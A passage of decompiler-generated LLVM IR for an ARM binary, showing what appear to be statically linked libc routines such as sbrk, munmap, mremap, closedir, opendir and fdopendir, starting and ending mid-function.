  %v3_17b08 = load i32, i32* @r7, align 4
  store i32 %v3_17b08, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17b30, label %dec_label_pc_17b20

dec_label_pc_17b20:                               ; preds = %entry
  %v0_17b20 = call i32 @__GI___errno_location()
  %v0_17b24 = load i32, i32* %r7.global-to-local, align 4
  %v1_17b24 = sub i32 0, %v0_17b24
  %v2_17b28 = inttoptr i32 %v0_17b20 to i32*
  store i32 %v1_17b24, i32* %v2_17b28, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17b34.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17b30

dec_label_pc_17b30:                               ; preds = %entry, %dec_label_pc_17b20
  %v2_17b34 = phi i32 [ %v3_17b08, %entry ], [ %v2_17b34.pre, %dec_label_pc_17b20 ]
  %v0_17b30 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_17b20 ]
  store i32 %v2_17b34, i32* @r7, align 4
  ret i32 %v0_17b30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17b30, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_17b4c = load i32, i32* @r0, align 4
  ret i32 %v1_17b4c
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_17b60 = load i32, i32* @r0, align 4
  ret i32 %v1_17b60
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17b64 = load i32, i32* @r4, align 4
  store i32 %v3_17b64, i32* %stack_var_-16, align 4
  store i32 26520, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r4.global-to-local, align 4
  %v4_17b74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 26520) to i32*), align 4
  %v2_17b78 = icmp eq i32 %v4_17b74, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_17b78, label %dec_label_pc_17b84, label %dec_label_pc_17b94

dec_label_pc_17b84:                               ; preds = %entry
  %v1_17b88 = call i32 @__GI_brk(i32 0)
  %v1_17b8c = icmp slt i32 %v1_17b88, 0
  br i1 %v1_17b8c, label %dec_label_pc_17bb8, label %dec_label_pc_17b94thread-pre-split

dec_label_pc_17b94thread-pre-split:               ; preds = %dec_label_pc_17b84
  %v0_17b98.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_17b94.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17b94.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17b94

dec_label_pc_17b94:                               ; preds = %dec_label_pc_17b94thread-pre-split, %entry
  %v1_17b94 = phi i32 [ %v1_17b94.pre, %dec_label_pc_17b94thread-pre-split ], [ 26520, %entry ]
  %v0_17b94 = phi i32 [ %v0_17b94.pre, %dec_label_pc_17b94thread-pre-split ], [ ptrtoint (i32* @global_var_28010.981 to i32), %entry ]
  %v1_17ba8 = phi i32 [ %v0_17b98.pr, %dec_label_pc_17b94thread-pre-split ], [ %arg1, %entry ]
  %v2_17b94 = add i32 %v0_17b94, %v1_17b94
  %v3_17b94 = inttoptr i32 %v2_17b94 to i32*
  %v4_17b94 = load i32, i32* %v3_17b94, align 4
  %v2_17b98 = icmp eq i32 %v1_17ba8, 0
  store i32 %v4_17b94, i32* %r4.global-to-local, align 4
  br i1 %v2_17b98, label %dec_label_pc_17bbc, label %dec_label_pc_17ba4

dec_label_pc_17ba4:                               ; preds = %dec_label_pc_17b94
  %v2_17ba8 = add i32 %v4_17b94, %v1_17ba8
  %v1_17bac = call i32 @__GI_brk(i32 %v2_17ba8)
  %v1_17bb0 = icmp slt i32 %v1_17bac, 0
  br i1 %v1_17bb0, label %dec_label_pc_17bb8, label %dec_label_pc_17ba4.dec_label_pc_17bbc_crit_edge

dec_label_pc_17ba4.dec_label_pc_17bbc_crit_edge:  ; preds = %dec_label_pc_17ba4
  %v0_17bbc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17bbc

dec_label_pc_17bb8:                               ; preds = %dec_label_pc_17ba4, %dec_label_pc_17b84
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17bbc

dec_label_pc_17bbc:                               ; preds = %dec_label_pc_17b94, %dec_label_pc_17ba4.dec_label_pc_17bbc_crit_edge, %dec_label_pc_17bb8
  %v0_17bbc = phi i32 [ %v0_17bbc.pre, %dec_label_pc_17ba4.dec_label_pc_17bbc_crit_edge ], [ -1, %dec_label_pc_17bb8 ], [ %v4_17b94, %dec_label_pc_17b94 ]
  %v2_17bc0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17bc0, i32* @r4, align 4
  ret i32 %v0_17bbc

; uselistorder directives
  uselistorder i32 %v4_17b94, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_17bbc, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17be0 = load i32, i32* @r0, align 4
  ret i32 %v1_17be0
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17be4 = load i32, i32* @r7, align 4
  store i32 %v3_17be4, i32* %stack_var_-8, align 4
  %v0_17bf0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17bf0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17bf0, -4095
  br i1 %tmp, label %dec_label_pc_17c10, label %dec_label_pc_17c00

dec_label_pc_17c00:                               ; preds = %entry
  %v0_17c00 = call i32 @__GI___errno_location()
  %v0_17c04 = load i32, i32* %r7.global-to-local, align 4
  %v1_17c04 = sub i32 0, %v0_17c04
  %v2_17c08 = inttoptr i32 %v0_17c00 to i32*
  store i32 %v1_17c04, i32* %v2_17c08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17c10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17c10

dec_label_pc_17c10:                               ; preds = %entry, %dec_label_pc_17c00
  %v1_17c14 = phi i32 [ %v0_17bf0, %entry ], [ -1, %dec_label_pc_17c00 ]
  %v2_17c10 = phi i32 [ %v3_17be4, %entry ], [ %v2_17c10.pre, %dec_label_pc_17c00 ]
  store i32 %v2_17c10, i32* @r7, align 4
  ret i32 %v1_17c14

; uselistorder directives
  uselistorder i32 %v0_17bf0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17c10, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17c18 = load i32, i32* @r7, align 4
  store i32 %v3_17c18, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17c40, label %dec_label_pc_17c30

dec_label_pc_17c30:                               ; preds = %entry
  %v0_17c30 = call i32 @__GI___errno_location()
  %v0_17c34 = load i32, i32* %r7.global-to-local, align 4
  %v1_17c34 = sub i32 0, %v0_17c34
  %v2_17c38 = inttoptr i32 %v0_17c30 to i32*
  store i32 %v1_17c34, i32* %v2_17c38, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17c44.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17c40

dec_label_pc_17c40:                               ; preds = %entry, %dec_label_pc_17c30
  %v2_17c44 = phi i32 [ %v3_17c18, %entry ], [ %v2_17c44.pre, %dec_label_pc_17c30 ]
  %v0_17c40 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_17c30 ]
  store i32 %v2_17c44, i32* @r7, align 4
  ret i32 %v0_17c40

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17c40, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17c80, label %dec_label_pc_17c70

dec_label_pc_17c70:                               ; preds = %entry
  %v0_17c70 = call i32 @__GI___errno_location()
  %v0_17c74 = load i32, i32* %r4.global-to-local, align 4
  %v1_17c74 = sub i32 0, %v0_17c74
  %v2_17c78 = inttoptr i32 %v0_17c70 to i32*
  store i32 %v1_17c74, i32* %v2_17c78, align 4
  br label %dec_label_pc_17c80

dec_label_pc_17c80:                               ; preds = %entry, %dec_label_pc_17c70
  %v1_17c88 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_17c70 ]
  ret i32 %v1_17c88

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17c80, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17c8c = load i32, i32* @r7, align 4
  store i32 %v3_17c8c, i32* %stack_var_-8, align 4
  %v0_17c98 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17c98, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17c98, -4095
  br i1 %tmp, label %dec_label_pc_17cb8, label %dec_label_pc_17ca8

dec_label_pc_17ca8:                               ; preds = %entry
  %v0_17ca8 = call i32 @__GI___errno_location()
  %v0_17cac = load i32, i32* %r7.global-to-local, align 4
  %v1_17cac = sub i32 0, %v0_17cac
  %v2_17cb0 = inttoptr i32 %v0_17ca8 to i32*
  store i32 %v1_17cac, i32* %v2_17cb0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17cb8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17cb8

dec_label_pc_17cb8:                               ; preds = %entry, %dec_label_pc_17ca8
  %v1_17cbc = phi i32 [ %v0_17c98, %entry ], [ -1, %dec_label_pc_17ca8 ]
  %v2_17cb8 = phi i32 [ %v3_17c8c, %entry ], [ %v2_17cb8.pre, %dec_label_pc_17ca8 ]
  store i32 %v2_17cb8, i32* @r7, align 4
  ret i32 %v1_17cbc

; uselistorder directives
  uselistorder i32 %v0_17c98, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17cb8, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_17cc0 = load i32, i32* @r4, align 4
  store i32 %v3_17cc0, i32* %stack_var_-24, align 4
  %v2_17cc4 = load i32, i32* %arg1, align 4
  store i32 %v2_17cc4, i32* %r4.global-to-local, align 4
  %v3_17ccc = icmp eq i32 %v2_17cc4, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r6, align 4
  br i1 %v3_17ccc, label %dec_label_pc_17ce0, label %dec_label_pc_17cf4

dec_label_pc_17ce0:                               ; preds = %entry
  %v0_17ce0 = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_17ce8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17ce8, i32* %r2.global-to-local, align 4
  %v2_17cec = inttoptr i32 %v0_17ce0 to i32*
  store i32 9, i32* %v2_17cec, align 4
  %v0_17d94.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d94

dec_label_pc_17cf4:                               ; preds = %entry
  store i32 40, i32* %r3.global-to-local, align 4
  %v1_17cf8 = add i32 %tmp, 24
  store i32 %v1_17cf8, i32* %r4.global-to-local, align 4
  store i32 %v1_17cf8, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_17d0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17d0c)
  store i32 -1, i32* @r8, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_17d24 = load i32, i32* @r6, align 4
  %v2_17d24 = add i32 %v0_17d24, 20
  %v3_17d24 = inttoptr i32 %v2_17d24 to i32*
  %v4_17d24 = load i32, i32* %v3_17d24, align 4
  call void @__pseudo_branch(i32 %v4_17d24)
  %v0_17d30 = load i32, i32* @r7, align 4
  %v1_17d30 = inttoptr i32 %v0_17d30 to i32*
  %v2_17d30 = load i32, i32* %v1_17d30, align 4
  store i32 %v2_17d30, i32* @r4, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_17d40 = load i32, i32* @r8, align 4
  store i32 %v0_17d40, i32* %v1_17d30, align 4
  %v0_17d44 = load i32, i32* @r6, align 4
  %v1_17d44 = load i32, i32* %r3.global-to-local, align 4
  %v2_17d44 = add i32 %v1_17d44, %v0_17d44
  %v3_17d44 = inttoptr i32 %v2_17d44 to i32*
  %v4_17d44 = load i32, i32* %v3_17d44, align 4
  store i32 ptrtoint (i32* @global_var_17d50.1275 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17d44)
  %v0_17d50 = load i32, i32* @r7, align 4
  %v1_17d50 = add i32 %v0_17d50, 12
  %v2_17d50 = inttoptr i32 %v1_17d50 to i32*
  %v3_17d50 = load i32, i32* %v2_17d50, align 4
  store i32 %v3_17d50, i32* @r0, align 4
  %v0_17d54 = call i32 @free()
  %v0_17d58 = load i32, i32* @r7, align 4
  store i32 %v0_17d58, i32* @r0, align 4
  %v0_17d5c = call i32 @free()
  %v0_17d64 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_17d64, -4095
  br i1 %tmp11, label %dec_label_pc_17d90, label %dec_label_pc_17d80

dec_label_pc_17d80:                               ; preds = %dec_label_pc_17cf4
  %v0_17d80 = call i32 @__GI___errno_location()
  %v0_17d84 = load i32, i32* @r4, align 4
  %v1_17d84 = sub i32 0, %v0_17d84
  store i32 %v1_17d84, i32* %r3.global-to-local, align 4
  %v2_17d88 = inttoptr i32 %v0_17d80 to i32*
  store i32 %v1_17d84, i32* %v2_17d88, align 4
  %v0_17d8c = load i32, i32* @r8, align 4
  br label %dec_label_pc_17d90

dec_label_pc_17d90:                               ; preds = %dec_label_pc_17cf4, %dec_label_pc_17d80
  %v0_17d90 = phi i32 [ %v0_17d64, %dec_label_pc_17cf4 ], [ %v0_17d8c, %dec_label_pc_17d80 ]
  store i32 %v0_17d90, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d94

dec_label_pc_17d94:                               ; preds = %dec_label_pc_17ce0, %dec_label_pc_17d90
  %v0_17d94 = phi i32 [ %v0_17d94.pre, %dec_label_pc_17ce0 ], [ %v0_17d90, %dec_label_pc_17d90 ]
  %v2_17d9c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17d9c, i32* %r4.global-to-local, align 4
  ret i32 %v0_17d94

; uselistorder directives
  uselistorder i32 %v0_17d64, { 1, 0 }
  uselistorder label %dec_label_pc_17d94, { 1, 0 }
  uselistorder label %dec_label_pc_17d90, { 1, 0 }
}

define i32 @function_17da8(i32 %arg1) local_unnamed_addr {
dec_label_pc_17da8:
  %v0_17da8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17da8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17da8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17da8, %bb
  %v10_17db4 = phi i32 [ %arg1, %dec_label_pc_17da8 ], [ 0, %bb ]
  ret i32 %v10_17db4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_17db8 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_17dcc = call i32 @malloc(i32 48)
  %v2_17dd4 = icmp eq i32 %v1_17dcc, 0
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r6, align 4
  br i1 %v2_17dd4, label %bb, label %dec_label_pc_17de4

bb:                                               ; preds = %entry
  br label %dec_label_pc_17e70

dec_label_pc_17de4:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17de8 = load i32, i32* @r4, align 4
  %v2_17de8 = icmp ugt i32 %v0_17de8, 511
  %v2_17dec = add i32 %v1_17dcc, 4
  %v3_17dec = inttoptr i32 %v2_17dec to i32*
  store i32 0, i32* %v3_17dec, align 4
  %v0_17df0 = load i32, i32* %r3.global-to-local, align 4
  %v2_17df0 = add i32 %v1_17dcc, 16
  %v3_17df0 = inttoptr i32 %v2_17df0 to i32*
  store i32 %v0_17df0, i32* %v3_17df0, align 4
  %v0_17df4 = load i32, i32* %r3.global-to-local, align 4
  %v2_17df4 = add i32 %v1_17dcc, 8
  %v3_17df4 = inttoptr i32 %v2_17df4 to i32*
  store i32 %v0_17df4, i32* %v3_17df4, align 4
  br i1 %v2_17de8, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_17de4
  %v0_17dfc2 = load i32, i32* @r4, align 4
  %v2_17dfc3 = add i32 %v1_17dcc, 20
  %v3_17dfc4 = inttoptr i32 %v2_17dfc3 to i32*
  store i32 %v0_17dfc2, i32* %v3_17dfc4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_17de4
  %v1_17df8 = load i32, i32* %r3.global-to-local, align 4
  %v2_17df8 = add i32 %v1_17df8, 512
  store i32 %v2_17df8, i32* %r3.global-to-local, align 4
  %v0_17dfc = load i32, i32* @r4, align 4
  %v2_17dfc = add i32 %v1_17dcc, 20
  %v3_17dfc = inttoptr i32 %v2_17dfc to i32*
  store i32 %v0_17dfc, i32* %v3_17dfc, align 4
  %v1_17e00 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_17e00, i32* %v3_17dfc, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_17dcc, i32* @r5, align 4
  %v0_17e08 = load i32, i32* @r7, align 4
  %v2_17e08 = inttoptr i32 %v1_17dcc to i32*
  store i32 %v0_17e08, i32* %v2_17e08, align 4
  %v0_17e0c = load i32, i32* @r5, align 4
  %v1_17e0c = add i32 %v0_17e0c, 20
  %v2_17e0c = inttoptr i32 %v1_17e0c to i32*
  %v3_17e0c = load i32, i32* %v2_17e0c, align 4
  store i32 %v3_17e0c, i32* %r1.global-to-local, align 4
  %v2_17e14 = call i32 @calloc(i32 1, i32 %v3_17e0c)
  %v2_17e18 = icmp eq i32 %v2_17e14, 0
  store i32 %v2_17e14, i32* @r4, align 4
  %v1_17e20 = load i32, i32* @r5, align 4
  %v2_17e20 = add i32 %v1_17e20, 12
  %v3_17e20 = inttoptr i32 %v2_17e20 to i32*
  store i32 %v2_17e14, i32* %v3_17e20, align 4
  br i1 %v2_17e18, label %dec_label_pc_17e28, label %dec_label_pc_17e38

dec_label_pc_17e28:                               ; preds = %bb17
  %v0_17e28 = load i32, i32* @r5, align 4
  store i32 %v0_17e28, i32* @r0, align 4
  %v0_17e2c = call i32 @free()
  %v0_17e30 = load i32, i32* @r4, align 4
  br label %dec_label_pc_17e70

dec_label_pc_17e38:                               ; preds = %bb17
  %v0_17e3c = load i32, i32* @r6, align 4
  %v2_17e3c = add i32 %v0_17e3c, -1448
  store i32 %v2_17e3c, i32* %r3.global-to-local, align 4
  %v1_17e44 = inttoptr i32 %v2_17e3c to i32*
  %v2_17e44 = load i32, i32* %v1_17e44, align 4
  %v3_17e44 = add i32 %v0_17e3c, -1444
  %v4_17e44 = inttoptr i32 %v3_17e44 to i32*
  %v5_17e44 = load i32, i32* %v4_17e44, align 4
  store i32 %v5_17e44, i32* %r1.global-to-local, align 4
  %v6_17e44 = add i32 %v0_17e3c, -1440
  %v7_17e44 = inttoptr i32 %v6_17e44 to i32*
  %v8_17e44 = load i32, i32* %v7_17e44, align 4
  store i32 %v8_17e44, i32* %r2.global-to-local, align 4
  %v9_17e44 = add i32 %v0_17e3c, -1436
  %v10_17e44 = inttoptr i32 %v9_17e44 to i32*
  %v11_17e44 = load i32, i32* %v10_17e44, align 4
  store i32 %v11_17e44, i32* %r3.global-to-local, align 4
  %v12_17e44 = add i32 %v0_17e3c, -1432
  %v1_17e50 = inttoptr i32 %v12_17e44 to i32*
  %v2_17e50 = load i32, i32* %v1_17e50, align 4
  %v3_17e50 = add i32 %v0_17e3c, -1428
  %v4_17e50 = inttoptr i32 %v3_17e50 to i32*
  %v5_17e50 = load i32, i32* %v4_17e50, align 4
  store i32 %v2_17e50, i32* %stack_var_-32, align 4
  store i32 %v5_17e44, i32* %r1.global-to-local, align 4
  store i32 %v8_17e44, i32* %r2.global-to-local, align 4
  store i32 %v11_17e44, i32* %r3.global-to-local, align 4
  %v0_17e60 = load i32, i32* @r5, align 4
  %v1_17e60 = add i32 %v0_17e60, 24
  %v1_17e64 = inttoptr i32 %v1_17e60 to i32*
  store i32 %v2_17e44, i32* %v1_17e64, align 4
  %v3_17e64 = add i32 %v0_17e60, 28
  %v4_17e64 = inttoptr i32 %v3_17e64 to i32*
  %v5_17e64 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17e64, i32* %v4_17e64, align 4
  %v6_17e64 = add i32 %v0_17e60, 32
  %v7_17e64 = inttoptr i32 %v6_17e64 to i32*
  %v8_17e64 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17e64, i32* %v7_17e64, align 4
  %v9_17e64 = add i32 %v0_17e60, 36
  %v10_17e64 = inttoptr i32 %v9_17e64 to i32*
  %v11_17e64 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_17e64, i32* %v10_17e64, align 4
  %v12_17e64 = add i32 %v0_17e60, 40
  %v2_17e68 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_17e50, i32* %r1.global-to-local, align 4
  %v1_17e6c = inttoptr i32 %v12_17e64 to i32*
  store i32 %v2_17e68, i32* %v1_17e6c, align 4
  %v3_17e6c = add i32 %v0_17e60, 44
  %v4_17e6c = inttoptr i32 %v3_17e6c to i32*
  %v5_17e6c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17e6c, i32* %v4_17e6c, align 4
  %v0_17e70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17e70

dec_label_pc_17e70:                               ; preds = %bb, %dec_label_pc_17e28, %dec_label_pc_17e38
  %v0_17e70 = phi i32 [ 0, %bb ], [ %v0_17e30, %dec_label_pc_17e28 ], [ %v0_17e70.pre, %dec_label_pc_17e38 ]
  store i32 %v12_17db8, i32* @r7, align 4
  ret i32 %v0_17e70

; uselistorder directives
  uselistorder i32 %v2_17e14, { 1, 0, 2 }
  uselistorder i32 %v1_17dcc, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_17e70, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_17e90 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_17eb8, label %dec_label_pc_17ea8

dec_label_pc_17ea8:                               ; preds = %entry
  %v0_17ea8 = call i32 @__GI___errno_location()
  %v0_17eac = load i32, i32* @r7, align 4
  %v1_17eac = sub i32 0, %v0_17eac
  %v2_17eb0 = inttoptr i32 %v0_17ea8 to i32*
  store i32 %v1_17eac, i32* %v2_17eb0, align 4
  br label %dec_label_pc_17edc

dec_label_pc_17eb8:                               ; preds = %entry
  %v1_17eb8 = icmp slt i32 %arg1, 0
  br i1 %v1_17eb8, label %dec_label_pc_17edc, label %dec_label_pc_17ec0

dec_label_pc_17ec0:                               ; preds = %dec_label_pc_17eb8
  store i32 %v2_17e90, i32* @r1, align 4
  %v0_17ec4 = call i32 @fstat()
  %v1_17ec8 = icmp slt i32 %v0_17ec4, 0
  br i1 %v1_17ec8, label %dec_label_pc_17ed0, label %dec_label_pc_17ee4

dec_label_pc_17ed0:                               ; preds = %dec_label_pc_17ec0
  br label %dec_label_pc_17edc

dec_label_pc_17edc:                               ; preds = %dec_label_pc_17ed0, %dec_label_pc_17eb8, %dec_label_pc_17ea8
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17f20

dec_label_pc_17ee4:                               ; preds = %dec_label_pc_17ec0
  %v0_17eec = load i32, i32* @r7, align 4
  %v3_17ef0 = call i32 @__GI___fcntl_nocancel(i32 %v0_17eec, i32 2, i32 1)
  %v0_17ef4 = load i32, i32* @r7, align 4
  %v2_17efc = call i32 @fd_to_DIR(i32 %v0_17ef4, i32 %tmp)
  store i32 %v2_17efc, i32* %r4.global-to-local, align 4
  %v2_17f00 = icmp eq i32 %v2_17efc, 0
  br i1 %v2_17f00, label %dec_label_pc_17f08, label %dec_label_pc_17f20

dec_label_pc_17f08:                               ; preds = %dec_label_pc_17ee4
  %v0_17f14 = call i32 @__GI___errno_location()
  %v2_17f1c = inttoptr i32 %v0_17f14 to i32*
  store i32 12, i32* %v2_17f1c, align 4
  %v0_17f20.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17f20

dec_label_pc_17f20:                               ; preds = %dec_label_pc_17ee4, %dec_label_pc_17edc, %dec_label_pc_17f08
  %v0_17f20 = phi i32 [ %v2_17efc, %dec_label_pc_17ee4 ], [ 0, %dec_label_pc_17edc ], [ %v0_17f20.pre, %dec_label_pc_17f08 ]
  ret i32 %v0_17f20

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17f20, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_17f38 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_17f38, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_17f44 = call i32 @fstat()
  store i32 %v0_17f44, i32* @r5, align 4
  %v2_17f48 = icmp eq i32 %v0_17f44, 0
  br i1 %v2_17f48, label %dec_label_pc_17f50, label %dec_label_pc_17fb8

dec_label_pc_17f50:                               ; preds = %entry
  %v1_17f54 = and i32 %tmp4, ptrtoint (i32* @global_var_f000.408 to i32)
  store i32 %v1_17f54, i32* @r3, align 4
  %v7_17f58 = icmp eq i32 %v1_17f54, 16384
  br i1 %v7_17f58, label %dec_label_pc_17f70, label %dec_label_pc_17f60

dec_label_pc_17f60:                               ; preds = %dec_label_pc_17f50
  %v0_17f60 = call i32 @__GI___errno_location()
  br label %dec_label_pc_17f9c

dec_label_pc_17f70:                               ; preds = %dec_label_pc_17f50
  %v0_17f70 = load i32, i32* @r4, align 4
  %v2_17f78 = call i32 @__libc_fcntl(i32 %v0_17f70, i32 3)
  %v7_17f7c = icmp eq i32 %v2_17f78, -1
  br i1 %v7_17f7c, label %dec_label_pc_17fb8, label %dec_label_pc_17f84

dec_label_pc_17f84:                               ; preds = %dec_label_pc_17f70
  %v1_17f84 = urem i32 %v2_17f78, 4
  %v7_17f88 = icmp eq i32 %v1_17f84, 1
  br i1 %v7_17f88, label %dec_label_pc_17f90, label %dec_label_pc_17fa4

dec_label_pc_17f90:                               ; preds = %dec_label_pc_17f84
  %v0_17f90 = call i32 @__GI___errno_location()
  br label %dec_label_pc_17f9c

dec_label_pc_17f9c:                               ; preds = %dec_label_pc_17f60, %dec_label_pc_17f90
  %storemerge2 = phi i32 [ %v0_17f60, %dec_label_pc_17f60 ], [ %v0_17f90, %dec_label_pc_17f90 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_17f60 ], [ 22, %dec_label_pc_17f90 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_17f9c = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_17f9c, align 4
  %v0_17fbc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17fbc

